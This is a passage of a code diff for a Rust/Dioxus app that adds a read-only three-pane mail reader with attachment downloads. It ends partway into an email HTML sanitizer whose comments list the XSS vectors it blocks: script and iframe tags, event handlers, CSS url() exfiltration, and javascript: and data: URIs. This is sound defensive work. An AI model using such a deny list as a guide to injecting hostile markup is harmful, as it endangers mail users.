@@ -20,7 +20,10 @@ use dioxus::prelude::*;
 use hive_core::keys::{KeySource, KeychainKeySource, MemoryKeySource};
 use hive_core::store::custom_entities::EntityFilter;
 use hive_core::store::events::EventCreate;
-use hive_core::store::mail::MailAccountAdminView;
+use hive_core::store::mail::{
+    MailAccountAdminView, MailAttachmentChip, MailMailboxView, MailMessageSummary,
+    MailThreadMessage,
+};
 use hive_core::store::tasks::TaskFilter;
 use hive_core::store::Store;
 use hive_embed::{Backend, EmbedConfig, Embedder, RuntimeEmbedder};
@@ -1417,12 +1420,846 @@ fn segmented_style(on: bool) -> String {
 /// commits). None = nothing armed.
 type ArmedDelete = Option<String>;
 
+// ── Mail: the Apple-Mail three-pane reader (Slice B, READ-ONLY) ───────────────
+//
+// Left: accounts grouped by owner identity, each with its mailboxes (folder +
+// unread badge) and a global search box + an Accounts gear that flips to the
+// Slice-A account manager. Middle: the selected mailbox's (or search's) message
+// list, newest first. Right: the selected message's whole thread, each body
+// rendered SAFELY (`render_email_body`) with a per-message "Load remote images"
+// opt-in and attachment chips served from the blockstore as data: URLs.
+//
+// READ-ONLY: no mark-read-on-open, no label editing, no move/delete, no
+// compose — those need JMAP write-back (a later slice). Read-state, labels, and
+// folders all come FROM the sync.
+
+/// What the middle list is showing: a selected mailbox, or search results.
+#[derive(Clone, PartialEq)]
+enum MailListSource {
+    None,
+    Mailbox { id: String, name: String },
+    Search { query: String },
+}
+
 #[component]
 fn MailPane(store: ReadOnlySignal<Store>) -> Element {
+    // Flip between the reader and the Slice-A account manager (the gear).
+    let managing = use_signal(|| false);
     // Re-pulls the account list after add / toggle / resync / delete.
     let refresh = use_signal(|| 0u32);
+    // Pane-local selection so the three panes switch in place.
+    let source = use_signal(|| MailListSource::None);
+    let selected_msg = use_signal(|| Option::<MailMessageSummary>::None);
+    let search = use_signal(String::new);
 
-    // All connected accounts, with sync state, grouped by owner in render.
+    if managing() {
+        return rsx! { MailAccountsManager { store, refresh, managing } };
+    }
+
+    rsx! {
+        div {
+            id: "mail-pane",
+            style: "display: flex; height: 100%; min-height: 0; background: {BG};",
+            MailSidebar { store, refresh, source, selected_msg, search, managing }
+            MailList { store, source, selected_msg }
+            MailReader { store, selected_msg }
+        }
+    }
+}
+
+/// Left column: search box, Accounts gear, then accounts grouped by owner with
+/// each account's mailboxes (folder name + unread badge). Selecting a mailbox
+/// sets the list source; submitting the search sets a Search source.
+#[component]
+fn MailSidebar(
+    store: ReadOnlySignal<Store>,
+    refresh: Signal<u32>,
+    source: Signal<MailListSource>,
+    selected_msg: Signal<Option<MailMessageSummary>>,
+    search: Signal<String>,
+    managing: Signal<bool>,
+) -> Element {
+    let accounts = use_resource(move || {
+        let store = store();
+        async move {
+            let _ = refresh();
+            store
+                .mail_accounts_admin_list()
+                .await
+                .map_err(|e| format!("{e:#}"))
+        }
+    });
+
+    let run_search = move |_| {
+        let q = search().trim().to_string();
+        if q.is_empty() {
+            return;
+        }
+        let (mut selected_msg, mut source) = (selected_msg, source);
+        selected_msg.set(None);
+        source.set(MailListSource::Search { query: q });
+    };
+
+    rsx! {
+        div {
+            id: "mail-sidebar",
+            style: "width: 250px; flex: none; height: 100%; overflow-y: auto; \
+                    border-right: 1px solid {EDGE}; background: {PANEL}; \
+                    padding: 0.9rem 0.7rem 2rem;",
+
+            // header row: title + Accounts gear
+            div {
+                style: "display: flex; align-items: center; justify-content: space-between; \
+                        margin-bottom: 0.7rem;",
+                div {
+                    style: "display: flex; align-items: baseline; gap: 0.4rem;",
+                    div { style: "font-size: 1.1rem; font-weight: 700;", "Mail" }
+                    div { style: "color: {GOLD};", "✉" }
+                }
+                button {
+                    id: "mail-accounts-manage",
+                    style: "background: none; border: 1px solid {EDGE}; color: {DIM}; \
+                            border-radius: 8px; padding: 0.3rem 0.5rem; font-size: 0.9rem; \
+                            cursor: pointer;",
+                    title: "Manage accounts",
+                    onclick: move |_| managing.set(true),
+                    "⚙"
+                }
+            }
+
+            // global search
+            input {
+                id: "mail-search",
+                style: "{text_input_style()} margin-top: 0;",
+                r#type: "search",
+                placeholder: "Search all mail…",
+                value: "{search}",
+                oninput: move |e| search.set(e.value()),
+                onkeydown: move |e| {
+                    if e.key() == Key::Enter {
+                        run_search(());
+                    }
+                },
+            }
+
+            // accounts → mailboxes
+            div {
+                style: "margin-top: 1rem;",
+                match accounts() {
+                    None => muted("loading…"),
+                    Some(Err(e)) => muted(&format!("accounts unavailable: {e}")),
+                    Some(Ok(list)) if list.is_empty() => rsx! {
+                        div {
+                            style: "color: {FAINT}; font-size: 0.85rem; padding: 0.8rem 0.2rem; line-height: 1.5;",
+                            "No mailboxes yet. Tap ⚙ to connect one."
+                        }
+                    },
+                    Some(Ok(list)) => {
+                        let groups = group_accounts_by_owner(list);
+                        rsx! {
+                            for (owner, accts) in groups.into_iter() {
+                                div {
+                                    style: "margin-bottom: 1rem;",
+                                    div {
+                                        style: "font-size: 0.72rem; font-weight: 700; letter-spacing: 0.07em; \
+                                                text-transform: uppercase; color: {GOLD}; margin: 0.2rem 0.2rem 0.4rem;",
+                                        "{owner}"
+                                    }
+                                    for acct in accts.into_iter() {
+                                        {mail_account_group(store, acct, source, selected_msg)}
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// One account block in the sidebar: its address, then its mailboxes as
+/// selectable rows with an unread badge. A plain fn (its `MailAccountAdminView`
+/// has no `PartialEq`).
+fn mail_account_group(
+    store: ReadOnlySignal<Store>,
+    acct: MailAccountAdminView,
+    source: Signal<MailListSource>,
+    selected_msg: Signal<Option<MailMessageSummary>>,
+) -> Element {
+    let account_id = acct.id.clone();
+    let mailboxes = use_resource(move || {
+        let store = store();
+        let account_id = account_id.clone();
+        async move {
+            store
+                .mail_mailboxes_list(&account_id)
+                .await
+                .map_err(|e| format!("{e:#}"))
+        }
+    });
+
+    rsx! {
+        div {
+            id: "mail-account-{acct.id}",
+            style: "margin-bottom: 0.5rem;",
+            div {
+                style: "font-size: 0.82rem; color: {DIM}; padding: 0.1rem 0.2rem 0.25rem; \
+                        overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                title: "{acct.address}",
+                "{acct.address}"
+            }
+            match mailboxes() {
+                None => rsx! {
+                    div { style: "color: {FAINT}; font-size: 0.78rem; padding: 0.2rem 0.4rem;", "…" }
+                },
+                Some(Err(e)) => rsx! {
+                    div { style: "color: #e07a5f; font-size: 0.76rem; padding: 0.2rem 0.4rem;", "{e}" }
+                },
+                Some(Ok(boxes)) if boxes.is_empty() => rsx! {
+                    div {
+                        style: "color: {FAINT}; font-size: 0.76rem; padding: 0.2rem 0.4rem;",
+                        "no folders synced yet"
+                    }
+                },
+                Some(Ok(boxes)) => rsx! {
+                    for mbox in boxes.into_iter() {
+                        {mail_mailbox_row(mbox, source, selected_msg)}
+                    }
+                },
+            }
+        }
+    }
+}
+
+/// One selectable mailbox row: folder icon + name + unread badge, highlighted
+/// when it is the current list source.
+fn mail_mailbox_row(
+    mbox: MailMailboxView,
+    source: Signal<MailListSource>,
+    selected_msg: Signal<Option<MailMessageSummary>>,
+) -> Element {
+    let is_active = matches!(source(), MailListSource::Mailbox { ref id, .. } if id == &mbox.id);
+    let bg = if is_active { EDGE } else { "transparent" };
+    let weight = if mbox.unread > 0 { "700" } else { "500" };
+    let icon = mailbox_icon(mbox.role.as_deref(), &mbox.name);
+    let mbox_id = mbox.id.clone();
+    let mbox_name = mbox.name.clone();
+
+    rsx! {
+        div {
+            id: "mail-mailbox-{mbox.id}",
+            style: "display: flex; align-items: center; gap: 0.45rem; padding: 0.35rem 0.5rem; \
+                    border-radius: 7px; cursor: pointer; background: {bg}; margin: 0.05rem 0;",
+            onclick: move |_| {
+                let (mut selected_msg, mut source) = (selected_msg, source);
+                selected_msg.set(None);
+                source.set(MailListSource::Mailbox { id: mbox_id.clone(), name: mbox_name.clone() });
+            },
+            span { style: "font-size: 0.85rem; width: 1rem; text-align: center;", "{icon}" }
+            span {
+                style: "flex: 1; min-width: 0; font-size: 0.86rem; font-weight: {weight}; \
+                        color: {INK}; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                "{mbox.name}"
+            }
+            if mbox.unread > 0 {
+                span {
+                    style: "font-size: 0.72rem; font-weight: 700; color: #14120e; background: {GOLD}; \
+                            border-radius: 999px; padding: 0.05rem 0.42rem; min-width: 1rem; text-align: center;",
+                    "{mbox.unread}"
+                }
+            }
+        }
+    }
+}
+
+/// Middle column: the selected mailbox's or search's messages, newest first.
+#[component]
+fn MailList(
+    store: ReadOnlySignal<Store>,
+    source: Signal<MailListSource>,
+    selected_msg: Signal<Option<MailMessageSummary>>,
+) -> Element {
+    // Re-pulls whenever the source changes.
+    let messages = use_resource(move || {
+        let store = store();
+        let src = source();
+        async move {
+            match src {
+                MailListSource::None => Ok(Vec::new()),
+                MailListSource::Mailbox { id, .. } => store
+                    .mail_messages_by_mailbox(&id, 200)
+                    .await
+                    .map_err(|e| format!("{e:#}")),
+                MailListSource::Search { query } => store
+                    .mail_search(&query, 200)
+                    .await
+                    .map_err(|e| format!("{e:#}")),
+            }
+        }
+    });
+
+    let header = match source() {
+        MailListSource::None => String::new(),
+        MailListSource::Mailbox { name, .. } => name,
+        MailListSource::Search { query } => format!("Search: {query}"),
+    };
+
+    rsx! {
+        div {
+            id: "mail-list",
+            style: "width: 340px; flex: none; height: 100%; overflow-y: auto; \
+                    border-right: 1px solid {EDGE};",
+            if !header.is_empty() {
+                div {
+                    style: "position: sticky; top: 0; background: {BG}; z-index: 1; \
+                            padding: 0.8rem 1rem 0.6rem; border-bottom: 1px solid {EDGE}; \
+                            font-weight: 700; font-size: 0.95rem; overflow: hidden; \
+                            text-overflow: ellipsis; white-space: nowrap;",
+                    "{header}"
+                }
+            }
+            match messages() {
+                None if matches!(source(), MailListSource::None) => rsx! {
+                    div {
+                        style: "color: {FAINT}; font-size: 0.88rem; padding: 2rem 1rem; text-align: center; line-height: 1.6;",
+                        "Pick a mailbox on the left, or search, to read your mail."
+                    }
+                },
+                None => muted("loading messages…"),
+                Some(Err(e)) => muted(&format!("could not load: {e}")),
+                Some(Ok(list)) if list.is_empty() => rsx! {
+                    div {
+                        style: "color: {FAINT}; font-size: 0.88rem; padding: 2rem 1rem; text-align: center;",
+                        "No messages here."
+                    }
+                },
+                Some(Ok(list)) => rsx! {
+                    for msg in list.into_iter() {
+                        {mail_list_row(msg, selected_msg)}
+                    }
+                },
+            }
+        }
+    }
+}
+
+/// One message row in the middle list: unread dot, sender, subject, snippet,
+/// short date, and small label/flag chips. Click selects it for the reader.
+fn mail_list_row(
+    msg: MailMessageSummary,
+    selected_msg: Signal<Option<MailMessageSummary>>,
+) -> Element {
+    let is_selected = selected_msg()
+        .as_ref()
+        .map(|m| m.id == msg.id)
+        .unwrap_or(false);
+    let unread = !msg.labels.iter().any(|l| l == "seen");
+    let bg = if is_selected { EDGE } else { "transparent" };
+    let sender_weight = if unread { "700" } else { "600" };
+    let sender = sender_display(&msg.from);
+    let subject = if msg.subject.trim().is_empty() {
+        "(no subject)".to_string()
+    } else {
+        msg.subject.clone()
+    };
+    let date = short_relative(&msg.received_at);
+    // Chips: everything but the "seen" marker (that's the unread dot's job).
+    let chips: Vec<String> = msg
+        .labels
+        .iter()
+        .filter(|l| l.as_str() != "seen")
+        .cloned()
+        .collect();
+    let msg_for_click = msg.clone();
+
+    rsx! {
+        div {
+            id: "mail-msg-{msg.id}",
+            style: "display: flex; gap: 0.5rem; padding: 0.6rem 0.9rem; cursor: pointer; \
+                    background: {bg}; border-bottom: 1px solid {EDGE};",
+            onclick: move |_| {
+                let mut selected_msg = selected_msg;
+                selected_msg.set(Some(msg_for_click.clone()));
+            },
+            // unread dot column
+            div {
+                style: "flex: none; width: 0.5rem; padding-top: 0.35rem;",
+                if unread {
+                    div { style: "width: 0.5rem; height: 0.5rem; border-radius: 50%; background: {GOLD};" }
+                }
+            }
+            // main column
+            div {
+                style: "flex: 1; min-width: 0;",
+                div {
+                    style: "display: flex; align-items: baseline; gap: 0.5rem;",
+                    div {
+                        style: "flex: 1; min-width: 0; font-weight: {sender_weight}; \
+                                font-size: 0.88rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                        "{sender}"
+                    }
+                    div {
+                        style: "flex: none; color: {FAINT}; font-size: 0.74rem;",
+                        "{date}"
+                    }
+                }
+                div {
+                    style: "font-size: 0.85rem; color: {INK}; margin-top: 0.1rem; \
+                            overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                    "{subject}"
+                }
+                if let Some(snip) = msg.snippet.as_ref().filter(|s| !s.trim().is_empty()) {
+                    div {
+                        style: "font-size: 0.8rem; color: {DIM}; margin-top: 0.1rem; \
+                                overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                        "{snip}"
+                    }
+                }
+                if msg.has_attachments || !chips.is_empty() {
+                    div {
+                        style: "display: flex; flex-wrap: wrap; gap: 0.3rem; margin-top: 0.35rem; align-items: center;",
+                        if msg.has_attachments {
+                            span { style: "font-size: 0.72rem; color: {DIM};", "📎" }
+                        }
+                        for chip in chips.into_iter() {
+                            {label_chip(&chip)}
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// Right column: the selected message's whole thread. Prior messages collapse
+/// to a one-line header; the selected message expands with its sanitized body,
+/// label chips, and attachment chips.
+#[component]
+fn MailReader(
+    store: ReadOnlySignal<Store>,
+    selected_msg: Signal<Option<MailMessageSummary>>,
+) -> Element {
+    let thread = use_resource(move || {
+        let store = store();
+        let sel = selected_msg();
+        async move {
+            match sel {
+                None => Ok(None),
+                Some(msg) => store
+                    .mail_thread_get(&msg.thread_id)
+                    .await
+                    .map(Some)
+                    .map_err(|e| format!("{e:#}")),
+            }
+        }
+    });
+
+    let focused_id = selected_msg().map(|m| m.id);
+
+    rsx! {
+        div {
+            id: "mail-reader",
+            style: "flex: 1; min-width: 0; height: 100%; overflow-y: auto; background: {BG};",
+            match (selected_msg().is_some(), thread()) {
+                (false, _) => rsx! {
+                    div {
+                        style: "height: 100%; display: flex; align-items: center; justify-content: center; \
+                                color: {FAINT}; font-size: 0.9rem; text-align: center; padding: 2rem;",
+                        "Select a message to read it here."
+                    }
+                },
+                (true, None) => muted("opening…"),
+                (true, Some(Err(e))) => muted(&format!("could not open thread: {e}")),
+                (true, Some(Ok(None))) => muted("message not found."),
+                (true, Some(Ok(Some(thread)))) => {
+                    let subject = if thread.subject.trim().is_empty() {
+                        "(no subject)".to_string()
+                    } else {
+                        thread.subject.clone()
+                    };
+                    let count = thread.messages.len();
+                    rsx! {
+                        div {
+                            style: "max-width: 780px; margin: 0 auto; padding: 1.6rem 1.6rem 4rem;",
+                            div {
+                                style: "font-size: 1.3rem; font-weight: 700; line-height: 1.35;",
+                                "{subject}"
+                            }
+                            if count > 1 {
+                                div {
+                                    style: "color: {FAINT}; font-size: 0.8rem; margin-top: 0.25rem;",
+                                    "{count} messages in this conversation"
+                                }
+                            }
+                            div {
+                                style: "margin-top: 1.2rem;",
+                                for tmsg in thread.messages.into_iter() {
+                                    {mail_thread_message(store, tmsg, focused_id.as_deref())}
+                                }
+                            }
+                            // read-only honesty
+                            div {
+                                style: "margin-top: 2rem; padding-top: 1rem; border-top: 1px solid {EDGE}; \
+                                        color: {FAINT}; font-size: 0.8rem; line-height: 1.6;",
+                                "Reading only for now — replying, composing, and marking read or \
+                                 labeling arrive in the next update."
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// One message inside the reading pane. The focused message (the one clicked in
+/// the list) renders expanded; the rest of the thread collapses to a clickable
+/// one-line header that expands on demand. A plain fn (`MailThreadMessage` has
+/// no `PartialEq`).
+fn mail_thread_message(
+    store: ReadOnlySignal<Store>,
+    tmsg: MailThreadMessage,
+    focused_id: Option<&str>,
+) -> Element {
+    let is_focused = focused_id == Some(tmsg.summary.id.as_str());
+    let mut expanded = use_signal(|| is_focused);
+    let sender = tmsg.summary.from.clone();
+    let date = short_time(&tmsg.summary.received_at);
+    let to_line = if tmsg.summary.to.is_empty() {
+        String::new()
+    } else {
+        format!("to {}", tmsg.summary.to.join(", "))
+    };
+    let chips: Vec<String> = tmsg
+        .summary
+        .labels
+        .iter()
+        .filter(|l| l.as_str() != "seen")
+        .cloned()
+        .collect();
+
+    if !expanded() {
+        // Collapsed prior message: a single header line.
+        let snippet = tmsg.summary.snippet.clone().unwrap_or_default();
+        return rsx! {
+            div {
+                style: "border: 1px solid {EDGE}; border-radius: 10px; padding: 0.6rem 0.9rem; \
+                        margin-bottom: 0.7rem; cursor: pointer; background: {PANEL};",
+                onclick: move |_| expanded.set(true),
+                div {
+                    style: "display: flex; gap: 0.6rem; align-items: baseline;",
+                    div {
+                        style: "flex: 1; min-width: 0; font-weight: 600; font-size: 0.86rem; \
+                                overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                        "{sender}"
+                    }
+                    div { style: "flex: none; color: {FAINT}; font-size: 0.74rem;", "{date}" }
+                }
+                if !snippet.trim().is_empty() {
+                    div {
+                        style: "font-size: 0.8rem; color: {DIM}; margin-top: 0.15rem; \
+                                overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                        "{snippet}"
+                    }
+                }
+            }
+        };
+    }
+
+    rsx! {
+        div {
+            style: "border: 1px solid {EDGE}; border-radius: 10px; padding: 0.9rem 1.1rem; \
+                    margin-bottom: 0.9rem; background: {PANEL};",
+            // header
+            div {
+                style: "display: flex; gap: 0.6rem; align-items: baseline;",
+                div {
+                    style: "flex: 1; min-width: 0; font-weight: 700; font-size: 0.92rem; \
+                            overflow: hidden; text-overflow: ellipsis;",
+                    "{sender}"
+                }
+                div { style: "flex: none; color: {FAINT}; font-size: 0.78rem;", "{date}" }
+            }
+            if !to_line.is_empty() {
+                div {
+                    style: "color: {DIM}; font-size: 0.78rem; margin-top: 0.15rem; \
+                            overflow: hidden; text-overflow: ellipsis;",
+                    "{to_line}"
+                }
+            }
+            if !chips.is_empty() {
+                div {
+                    style: "display: flex; flex-wrap: wrap; gap: 0.3rem; margin-top: 0.5rem;",
+                    for chip in chips.into_iter() {
+                        {label_chip(&chip)}
+                    }
+                }
+            }
+            // the SANITIZED body + its remote-image opt-in
+            MailBodyView { id: tmsg.summary.id.clone(), body: tmsg.body_text.clone() }
+            // attachments
+            if !tmsg.attachments.is_empty() {
+                div {
+                    style: "display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 0.9rem; \
+                            padding-top: 0.7rem; border-top: 1px solid {EDGE};",
+                    for att in tmsg.attachments.into_iter() {
+                        {mail_attachment_chip(store, att)}
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// The sanitized message body plus a per-message "Load remote images" toggle.
+/// Default OFF: `render_email_body` blocks every remote fetch (tracking-pixel
+/// defense). Flipping the toggle re-renders allowing http(s) `<img src>` only,
+/// on this one message, as an explicit user action. Its own `#[component]` so
+/// the toggle owns a Copy signal that re-renders just this body.
+#[component]
+fn MailBodyView(id: String, body: String) -> Element {
+    let mut allow_remote = use_signal(|| false);
+    // Recompute only when the toggle flips (body is per-message constant).
+    let rendered = render_email_body(&body, allow_remote());
+    let toggle_id = format!("mail-remote-{id}");
+
+    rsx! {
+        div {
+            style: "margin-top: 0.7rem;",
+            // The reader body reuses the journal's scoped .md-body dark theme so
+            // links, lists, tables, and quotes read consistently.
+            div {
+                class: "md-body",
+                style: "font-size: 0.9rem; overflow-wrap: anywhere;",
+                dangerous_inner_html: "{rendered}",
+            }
+            div {
+                style: "margin-top: 0.7rem;",
+                button {
+                    id: "{toggle_id}",
+                    style: "background: none; border: 1px solid {EDGE}; color: {DIM}; \
+                            border-radius: 999px; padding: 0.25rem 0.7rem; font: inherit; \
+                            font-size: 0.76rem; cursor: pointer;",
+                    onclick: move |_| {
+                        let now = allow_remote();
+                        allow_remote.set(!now);
+                    },
+                    if allow_remote() {
+                        "Hide remote images"
+                    } else {
+                        "Load remote images"
+                    }
+                }
+                if !allow_remote() {
+                    span {
+                        style: "color: {FAINT}; font-size: 0.72rem; margin-left: 0.6rem;",
+                        "Remote images are blocked to protect your privacy."
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// An attachment chip. Clicking fetches the bytes from the local blockstore
+/// (`mail_attachment_serve`), builds a `data:` URL, and opens it in the OS
+/// browser (save/preview). Unstored (oversize/pending) attachments render
+/// dimmed and inert. A plain fn (`MailAttachmentChip` has no `PartialEq`).
+fn mail_attachment_chip(store: ReadOnlySignal<Store>, att: MailAttachmentChip) -> Element {
+    let mut err = use_signal(|| Option::<String>::None);
+    let mut busy = use_signal(|| false);
+    let att_id = att.id.clone();
+    let size_label = human_size(att.size);
+    let stored = att.stored;
+
+    let open = move |_| {
+        if busy() || !stored {
+            return;
+        }
+        let store = store();
+        let att_id = att_id.clone();
+        busy.set(true);
+        err.set(None);
+        spawn(async move {
+            match store.mail_attachment_serve(&att_id).await {
+                Ok(Some(serve)) => match serve.data {
+                    Some(bytes) => {
+                        // Bytes come from OUR local blockstore, base64 into a
+                        // data: URL, then a hidden in-webview anchor with a
+                        // `download` attribute is clicked to save/open it — no
+                        // external `open` crate, no network request. base64 and
+                        // the (sanitized) mime hold no JS-string metacharacters;
+                        // the filename is JSON-escaped for the same reason.
+                        use base64::Engine as _;
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
+                        let data_url = format!("data:{};base64,{}", serve.mime, b64);
+                        let fname = serde_json::to_string(&serve.filename)
+                            .unwrap_or_else(|_| "\"attachment\"".to_string());
+                        let script = format!(
+                            "const a=document.createElement('a');\
+                             a.href='{data_url}';a.download={fname};\
+                             document.body.appendChild(a);a.click();a.remove();"
+                        );
+                        dioxus::document::eval(&script);
+                    }
+                    None => err.set(Some("not downloaded yet".into())),
+                },
+                Ok(None) => err.set(Some("attachment missing".into())),
+                Err(e) => err.set(Some(format!("{e:#}"))),
+            }
+            busy.set(false);
+        });
+    };
+
+    let opacity = if stored { "1" } else { "0.5" };
+    let cursor = if stored { "pointer" } else { "default" };
+
+    rsx! {
+        div {
+            style: "display: inline-flex; flex-direction: column; gap: 0.15rem;",
+            button {
+                id: "mail-attachment-{att.id}",
+                disabled: !stored || busy(),
+                style: "display: inline-flex; align-items: center; gap: 0.4rem; \
+                        background: {BG}; border: 1px solid {EDGE}; color: {INK}; \
+                        border-radius: 8px; padding: 0.35rem 0.6rem; font: inherit; \
+                        font-size: 0.8rem; cursor: {cursor}; opacity: {opacity}; max-width: 260px;",
+                title: if stored { "Open / save this attachment" } else { "Not downloaded yet" },
+                onclick: open,
+                span { "📎" }
+                span {
+                    style: "overflow: hidden; text-overflow: ellipsis; white-space: nowrap;",
+                    "{att.filename}"
+                }
+                span { style: "color: {FAINT}; flex: none;", "{size_label}" }
+            }
+            if let Some(e) = err() {
+                span { style: "color: #e07a5f; font-size: 0.72rem;", "{e}" }
+            }
+        }
+    }
+}
+
+/// A small label/flag chip in the message list + reader. Flagged reads gold; the
+/// rest read as muted pills.
+fn label_chip(label: &str) -> Element {
+    let (bg, fg, border) = if label == "flagged" {
+        (GOLD, "#14120e", GOLD)
+    } else {
+        ("transparent", DIM, EDGE)
+    };
+    rsx! {
+        span {
+            style: "font-size: 0.7rem; font-weight: 600; color: {fg}; background: {bg}; \
+                    border: 1px solid {border}; border-radius: 999px; padding: 0.05rem 0.45rem; \
+                    white-space: nowrap;",
+            if label == "flagged" { "⚑ flagged" } else { "{label}" }
+        }
+    }
+}
+
+/// Group the flat admin-account list by owner identity, preserving the
+/// alphabetical owner-then-address order the store already returns.
+fn group_accounts_by_owner(
+    list: Vec<MailAccountAdminView>,
+) -> Vec<(String, Vec<MailAccountAdminView>)> {
+    let mut groups: Vec<(String, Vec<MailAccountAdminView>)> = Vec::new();
+    for acct in list {
+        match groups.last_mut() {
+            Some((owner, accts)) if owner == &acct.owner => accts.push(acct),
+            _ => groups.push((acct.owner.clone(), vec![acct])),
+        }
+    }
+    groups
+}
+
+/// A folder glyph for a mailbox, keyed on its JMAP role (falling back to a name
+/// sniff, then a generic folder).
+fn mailbox_icon(role: Option<&str>, name: &str) -> &'static str {
+    match role {
+        Some("inbox") => "📥",
+        Some("sent") => "📤",
+        Some("drafts") => "📝",
+        Some("trash") => "🗑",
+        Some("junk") | Some("spam") => "🚫",
+        Some("archive") => "🗄",
+        _ => match name.to_ascii_lowercase().as_str() {
+            "inbox" => "📥",
+            "sent" => "📤",
+            "drafts" => "📝",
+            "trash" => "🗑",
+            "spam" | "junk" => "🚫",
+            "archive" => "🗄",
+            _ => "📁",
+        },
+    }
+}
+
+/// The display name for a `Name <addr>` (or bare `addr`) sender: the name if
+/// present, else the address' local part, else the whole address.
+fn sender_display(from: &str) -> String {
+    let from = from.trim();
+    if let Some(idx) = from.find('<') {
+        let name = from[..idx].trim().trim_matches('"').trim();
+        if !name.is_empty() {
+            return name.to_string();
+        }
+        let addr = from[idx + 1..].trim_end_matches('>').trim();
+        return addr.to_string();
+    }
+    from.to_string()
+}
+
+/// A short, human date for the message list. If it is today, show HH:MM; if this
+/// year, show `Mon DD`; else `YYYY-MM-DD`. Parses the `now_iso` shape; falls
+/// back to the raw string's date part.
+fn short_relative(iso: &str) -> String {
+    if iso.len() < 10 {
+        return iso.to_string();
+    }
+    let today = today_ymd();
+    if iso.len() >= 16 && iso[..10] == today[..today.len().min(10)] {
+        return iso[11..16].to_string();
+    }
+    let year = &iso[..4];
+    if today.len() >= 4 && year == &today[..4] {
+        // "MM-DD" → "Mon DD"
+        if let (Ok(m), Ok(d)) = (iso[5..7].parse::<usize>(), iso[8..10].parse::<u32>()) {
+            const MONTHS: [&str; 12] = [
+                "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
+            ];
+            if (1..=12).contains(&m) {
+                return format!("{} {}", MONTHS[m - 1], d);
+            }
+        }
+    }
+    iso[..10].to_string()
+}
+
+/// Human-readable byte size for an attachment chip.
+fn human_size(bytes: i64) -> String {
+    let b = bytes.max(0) as f64;
+    if b < 1024.0 {
+        format!("{bytes} B")
+    } else if b < 1024.0 * 1024.0 {
+        format!("{:.0} KB", b / 1024.0)
+    } else if b < 1024.0 * 1024.0 * 1024.0 {
+        format!("{:.1} MB", b / (1024.0 * 1024.0))
+    } else {
+        format!("{:.1} GB", b / (1024.0 * 1024.0 * 1024.0))
+    }
+}
+
+/// The Slice-A account manager — connect/enable/resync/delete mailboxes. Reached
+/// from the reader's ⚙; a Back button returns to the three-pane reader. This is
+/// the original accounts-only pane, kept whole and reachable.
+#[component]
+fn MailAccountsManager(
+    store: ReadOnlySignal<Store>,
+    refresh: Signal<u32>,
+    managing: Signal<bool>,
+) -> Element {
     let accounts = use_resource(move || {
         let store = store();
         async move {
@@ -1438,6 +2275,16 @@ fn MailPane(store: ReadOnlySignal<Store>) -> Element {
         div {
             id: "mail-pane",
             style: "max-width: 720px; margin: 0 auto; padding: 2.2rem 1.4rem 4rem;",
+
+            // back to the reader
+            button {
+                id: "mail-accounts-back",
+                style: "background: none; border: 1px solid {EDGE}; color: {DIM}; \
+                        border-radius: 8px; padding: 0.35rem 0.8rem; font: inherit; \
+                        font-size: 0.82rem; cursor: pointer; margin-bottom: 1rem;",
+                onclick: move |_| managing.set(false),
+                "← Back to mail"
+            }
 
             // header
             div {
@@ -1482,13 +2329,12 @@ fn MailPane(store: ReadOnlySignal<Store>) -> Element {
                 }
             }
 
-            // quiet note about the reading UI + per-identity mailboxes
+            // quiet note about what's still to come
             div {
                 style: "margin-top: 2rem; padding-top: 1rem; border-top: 1px solid {EDGE}; \
                         color: {FAINT}; font-size: 0.82rem; line-height: 1.6;",
-                "Reading your mail — folders, threads, labels, and compose — arrives in the next \
-                 update. Each identity can have its own mailbox, so you send and receive as any \
-                 of them."
+                "Composing and replying — sending as any of your identities — arrive in the next \
+                 update. Reading, folders, threads, labels, and search are live now."
             }
         }
     }
@@ -3452,6 +4298,185 @@ fn render_markdown(md: &str) -> String {
         )
         .clean(&html)
         .to_string()
+}
+
+// ── mail body rendering — SAFE (DIRECTION.md D17/D24) ─────────────────────────
+//
+// Mail bodies are the single biggest XSS surface in hive: untrusted,
+// attacker-controlled markup rendered inside the app's own WebKit via
+// `dangerous_inner_html`. Two dedicated renderers gate it — one for HTML, one
+// for plaintext — and both make ZERO network requests by default (the
+// tracking-pixel / privacy defense). The ammonia policy below is the security
+// contract; its hostile-corpus unit tests (see the tests module) are what keep
+// it honest.
+
+/// Sanitize an untrusted email HTML body to markup that is SAFE to inject via
+/// `dangerous_inner_html`. Strict allowlist, deny by default:
+///   - DROPPED entirely: `<script>`, `<style>`, `<iframe>`, `<object>`,
+///     `<embed>`, `<form>`, `<input>`, `<link>`, `<base>`, `<meta>` (ammonia's
+///     default tag allowlist excludes them; script/style contents are removed
+///     too, not just unwrapped).
+///   - NO event handlers, NO inline `style` (kills CSS `url()` exfiltration /
+///     `expression()`), NO `class`/`id` — only the allowlisted per-tag attrs
+///     below survive; every other attribute is stripped.
+///   - URL schemes are restricted to http/https/mailto, so `javascript:` and
+///     `data:` URIs are neutralized wherever a URL can appear.
+///   - Remote resource loads are blocked unless `allow_remote_images`: with it
+///     OFF, `<img>` (and `<video>`/`<audio>`/`<source>`/`<picture>`) are
+///     removed so the reader fetches nothing. With it ON — an explicit,
+///     per-message user action — only `<img src>` returns, still http/https
+///     only and still WITHOUT `srcset` (no alternate remote candidates).
+///   - Links survive but are made inert: forced `target=_blank` +
+///     `rel="noopener noreferrer nofollow"` so a click opens the OS browser and
+///     can NEVER navigate the app webview.
+fn sanitize_email_html(html: &str, allow_remote_images: bool) -> String {
+    let mut b = ammonia::Builder::default();
